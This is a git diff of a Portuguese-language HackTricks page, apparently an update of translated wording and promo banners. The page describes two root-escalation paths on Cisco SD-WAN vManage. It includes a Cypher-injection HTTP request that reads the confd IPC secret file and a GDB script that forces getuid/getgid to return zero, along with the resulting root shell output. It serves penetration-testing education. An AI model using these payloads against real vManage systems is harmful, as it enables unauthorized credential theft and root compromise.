@@ -1,28 +1,31 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Caminho 1
+## Path 1
 
 (Exemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Após investigar um pouco a documentação relacionada ao `confd` e aos diferentes binários (acessíveis com uma conta no site da Cisco), descobrimos que, para autenticar o soquete IPC, ele usa um segredo localizado em `/etc/confd/confd_ipc_secret`:
+Após investigar um pouco através de alguma [documentação](http://66.218.245.39/doc/html/rn03re18.html) relacionada ao `confd` e os diferentes binários (acessíveis com uma conta no site da Cisco), descobrimos que para autenticar o socket IPC, ele usa um segredo localizado em `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Lembra-se da nossa instância do Neo4j? Está sendo executada sob os privilégios do usuário `vmanage`, permitindo-nos recuperar o arquivo usando a vulnerabilidade anterior:
+Lembre-se da nossa instância Neo4j? Ela está rodando sob os privilégios do usuário `vmanage`, permitindo-nos recuperar o arquivo usando a vulnerabilidade anterior:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -52,11 +55,11 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Caminho 2
+## Path 2
 
 (Exemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-O blog¹ da equipe synacktiv descreveu uma maneira elegante de obter um shell root, mas a ressalva é que requer obter uma cópia do `/usr/bin/confd_cli_user`, que é apenas legível por root. Encontrei outra maneira de escalar para root sem tanta complicação.
+O blog¹ da equipe synacktiv descreveu uma maneira elegante de obter um shell root, mas a desvantagem é que requer obter uma cópia do `/usr/bin/confd_cli_user`, que é legível apenas pelo root. Eu encontrei outra maneira de escalar para root sem esse incômodo.
 
 Quando desmontei o binário `/usr/bin/confd_cli`, observei o seguinte:
 ```
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Quando executo "ps aux", observei o seguinte (_nota -g 100 -u 107_)
+Quando eu executo “ps aux”, observei o seguinte (_note -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Eu hipotetizei que o programa "confd\_cli" passa o ID do usuário e o ID do grupo coletados do usuário logado para o aplicativo "cmdptywrapper".
+Eu hipotetizei que o programa “confd\_cli” passa o ID do usuário e o ID do grupo que coletou do usuário logado para o aplicativo “cmdptywrapper”.
 
-Minha primeira tentativa foi executar o "cmdptywrapper" diretamente e fornecendo `-g 0 -u 0`, mas falhou. Parece que um descritor de arquivo (-i 1015) foi criado em algum lugar ao longo do caminho e não consigo falsificá-lo.
+Minha primeira tentativa foi executar o “cmdptywrapper” diretamente e fornecê-lo com `-g 0 -u 0`, mas falhou. Parece que um descritor de arquivo (-i 1015) foi criado em algum lugar ao longo do caminho e não consigo falsificá-lo.
 
 Como mencionado no blog da synacktiv (último exemplo), o programa `confd_cli` não suporta argumentos de linha de comando, mas posso influenciá-lo com um depurador e, felizmente, o GDB está incluído no sistema.
 
-Criei um script GDB onde forcei a API `getuid` e `getgid` a retornar 0. Como já tenho o privilégio "vmanage" por meio da RCE de desserialização, tenho permissão para ler diretamente o `/etc/confd/confd_ipc_secret`.
+Eu criei um script GDB onde forcei a API `getuid` e `getgid` a retornar 0. Como já tenho privilégio “vmanage” através da RCE de desserialização, tenho permissão para ler o `/etc/confd/confd_ipc_secret` diretamente.
 
 root.gdb:
 ```
@@ -154,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Suporte ao HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
+{% endhint %}
